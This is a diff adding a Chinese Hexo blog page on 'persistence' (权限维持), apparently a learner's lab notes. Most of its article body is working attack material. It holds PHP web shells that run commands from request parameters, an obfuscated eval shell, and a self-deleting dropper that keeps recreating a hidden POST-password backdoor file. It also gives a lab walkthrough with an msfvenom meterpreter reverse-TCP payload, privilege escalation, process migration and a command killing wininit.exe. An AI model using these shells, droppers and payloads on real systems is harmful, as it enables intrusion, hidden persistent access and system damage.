@@ -1,0 +1,410 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>权限维持 - Hexo</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="四种执行函数123456789101112131415...">
+  <meta name="author" content="John Doe">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="https://at.alicdn.com/t/font_1445822_p6ry5n7lrr.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      loading: {
+        gif: '/images/theme/loading.gif',
+        lottie: ''
+      },
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: {
+          gif: '/images/theme/loading.gif',
+          lottie: ''
+        }
+      },
+      donate: {
+        enable: true,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          typing: true,
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: ''
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="lock-screen">
+  <div class="loading" id="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+    </div>
+    <div class="center">权限维持</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 摄影</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">权限维持</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>January 24, 2024</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>2635</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        
+        <h3 id="四种执行函数"><a href="#四种执行函数" class="headerlink" title="四种执行函数"></a>四种执行函数</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs txt">/* echo exec(&#x27;whoami&#x27;);<br>echo &quot;&lt;br&gt;&quot;;<br>$a = &quot;ping &quot;.$_GET[&#x27;a&#x27;];<br>if($a)&#123;<br>	@system($a);<br>	echo &quot;&lt;br&gt;&quot;;<br>&#125;<br>passthru(&quot;whoami&quot;);<br>echo &quot;&lt;br&gt;&quot;;<br>echo `whoami`;<br>echo &quot;&lt;br&gt;&quot;;<br>$b = $_GET[&#x27;cmd&#x27;];<br>if($b)&#123;<br>	@system($b);<br>	echo &quot;&lt;br&gt;&quot;;<br>&#125; */<br>// @assert($_POST[&#x27;a&#x27;]);<br>/* $addition = create_function(&#x27;$a.$b&#x27;,&#x27;return $a+$b;&#x27;);<br>echo $addition(2,3); */<br>/* $ngQK=create_function(chr(7560/210).base64_decode(&#x27;cw==&#x27;).chr(0x2b6-0x247).base64_decode(&#x27;bQ==&#x27;).chr(0423-0256),base64_decode(&#x27;ZQ==&#x27;).base64_decode(&#x27;dg==&#x27;).chr(0x168b8/0x3b8).str_rot13(&#x27;y&#x27;).chr(309-269).base64_decode(&#x27;JA==&#x27;).chr(0xb3b0/0x190).chr(78255/705).base64_decode(&#x27;bQ==&#x27;).base64_decode(&#x27;ZQ==&#x27;).str_rot13(&#x27;)&#x27;).chr(0x4610/0x130));<br>$ngQK(base64_decode(&#x27;NDkxN&#x27;.&#x27;TI5O0&#x27;.&#x27;BldkF&#x27;.&#x27;sKCRf&#x27;.&#x27;&#x27;.str_rot13(&#x27;H&#x27;).str_rot13(&#x27;R&#x27;).chr(077006/01066).base64_decode(&#x27;VA==&#x27;).base64_decode(&#x27;Vg==&#x27;).&#x27;&#x27;.&#x27;&#x27;.base64_decode(&#x27;Rg==&#x27;).chr(531-415).base64_decode(&#x27;ag==&#x27;).str_rot13(&#x27;o&#x27;).str_rot13(&#x27;J&#x27;).&#x27;&#x27;.&#x27;RdKTs&#x27;.&#x27;xNDc0&#x27;.&#x27;NTg3O&#x27;.&#x27;w==&#x27;.&#x27;&#x27;));<br><br><br>Attrib +s +a +h +r 1.txt隐藏文件1.txt<br></code></pre></td></tr></table></figure>
+
+<p>显示隐藏文件</p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/%E6%98%BE%E7%A4%BA%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">显示隐藏文件</span></p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/%E6%98%BE%E7%A4%BA%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B61.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">显示隐藏文件1</span></p>
+<h3 id="创建一个隐藏文件并在生效后自我删除的例子："><a href="#创建一个隐藏文件并在生效后自我删除的例子：" class="headerlink" title="创建一个隐藏文件并在生效后自我删除的例子："></a>创建一个隐藏文件并在生效后自我删除的例子：</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php<br>ignore_user_abort(); //关掉浏览器，PHP脚本也可以继续执行.<br>set_time_limit(0);//通过set_time_limit(0)可以让程序无限制的执行下去<br>$interval = 5; // 每隔*秒运行<br>do &#123;<br>$filename = &#x27;test.php&#x27;;<br>if(file_exists($filename)) &#123;<br>echo &quot;xxx&quot;;<br>&#125;<br>else &#123;<br>$file = fopen(&quot;test.php&quot;, &quot;w&quot;);<br>$txt = &quot;&lt;?php @eval($&quot;.&quot;_POST[cmd]);phpinfo(); ?&gt;\n&quot;;    //木马密码cmd<br>fwrite($file, $txt);<br>fclose($file);<br>eval(system(&quot;Attrib +s +a +h +r test.php&quot;)); //隐藏文件<br>unlink(__FILE__);<br>&#125;<br>sleep($interval);<br>&#125; while (true);<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="2024年1月22日靶机关键代码"><a href="#2024年1月22日靶机关键代码" class="headerlink" title="2024年1月22日靶机关键代码"></a>2024年1月22日靶机关键代码</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs txt"><br><br><br>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.2.60 lport=4444 -f exe -o 1.exe<br><br>run 双击木马<br>chcp 65001<br>whoami<br>exit<br>getsystem<br>shell<br>whoami<br>tasklist /SVC(复制后去https://i.hacking8.com/tiquan识别杀毒软件)<br>普通用户：systeminfo（复制去https://i.hacking8.com/tiquan看漏洞）<br><br><br><br><br>ps<br>migrate 4176(explorer.exe的id)<br><br>taskkill /F /T /IM wininit.exe<br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/copy.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">copy</span></p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/copy%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6%E8%87%B3%E8%AF%A5%E6%96%87%E4%BB%B6%E5%A4%B9.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">copy复制文件至该文件夹</span></p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/%E4%B8%8D%E5%8F%AF%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E5%A4%B9%E7%9A%84%E5%88%9B%E5%BB%BA%E4%B8%8E%E5%88%A0%E9%99%A4.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">不可修改文件夹的创建与删除</span></p>
+<h3 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h3><p>敏感信息泄露：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_65165505/article/details/133783811">https://blog.csdn.net/qq_65165505/article/details/133783811</a></p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/11.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">11</span></p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/12.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">12</span></p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/12..png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">12.</span></p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/13.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">13</span></p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/13..png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">13.</span></p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/14.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">14</span></p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/14..png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">14.</span></p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/14...png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">14..</span></p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/16%E6%8E%A2%E9%92%88.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">16探针</span></p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/16phpinfo.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">16phpinfo</span></p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/18.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">18</span></p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/18%E6%A0%B9%E6%8D%AE%E4%BB%A3%E7%A0%81.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">18根据代码</span></p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/19.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">19</span></p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/19..png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">19.</span></p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/20.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">20</span></p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/20231201.github.io/main/20..png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">20.</span></p>
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>John Doe</li>
+    <li><strong>本文链接：</strong><a href="http://example.com/2024/01/24/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/index.html" title="http:&#x2F;&#x2F;example.com&#x2F;2024&#x2F;01&#x2F;24&#x2F;%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81&#x2F;index.html">http:&#x2F;&#x2F;example.com&#x2F;2024&#x2F;01&#x2F;24&#x2F;%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+          <section class="donate">
+  <div id="qrcode-donate">
+    <img   class="lazyload" data-original="https://pic.izhaoo.com/alipay.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >
+  </div>
+  <div class="icon">
+    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
+    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
+  </div>
+</section>
+        
+        
+        
+  <nav class="nav">
+    <a></a>
+    <a href="/2024/01/24/DVWA-master%E5%92%8Cxss.tesla-space/">xss<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E7%A7%8D%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-text">四种执行函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%B9%B6%E5%9C%A8%E7%94%9F%E6%95%88%E5%90%8E%E8%87%AA%E6%88%91%E5%88%A0%E9%99%A4%E7%9A%84%E4%BE%8B%E5%AD%90%EF%BC%9A"><span class="toc-text">创建一个隐藏文件并在生效后自我删除的例子：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2024%E5%B9%B41%E6%9C%8822%E6%97%A5%E9%9D%B6%E6%9C%BA%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81"><span class="toc-text">2024年1月22日靶机关键代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow"><span class="toc-text">ctfshow</span></a></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=894519210 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://github.com/zhaoo "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:izhaoo@163.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
